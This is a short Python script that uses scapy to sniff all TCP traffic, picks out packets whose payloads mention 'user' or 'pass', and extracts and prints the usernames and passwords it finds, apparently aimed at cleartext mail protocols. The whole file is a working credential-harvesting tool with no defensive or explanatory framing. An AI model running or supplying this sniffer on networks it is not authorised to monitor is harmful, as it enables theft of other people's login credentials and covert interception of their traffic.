from scapy.all import *
import re

def packet_callback(packet):
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print("[*] Server: %s" % packet[IP].dst)
            print("[*] %s" % packet[TCP].payload)

            # Extract username and password
            username = re.findall("(?i)user[=:]\s*(\S+)", mail_packet)
            password = re.findall("(?i)pass[=:]\s*(\S+)", mail_packet)

            if username:
                print("[*] Found username: %s" % username[0])
            if password:
                print("[*] Found password: %s" % password[0])

sniff(prn=packet_callback, filter="tcp", store=0)
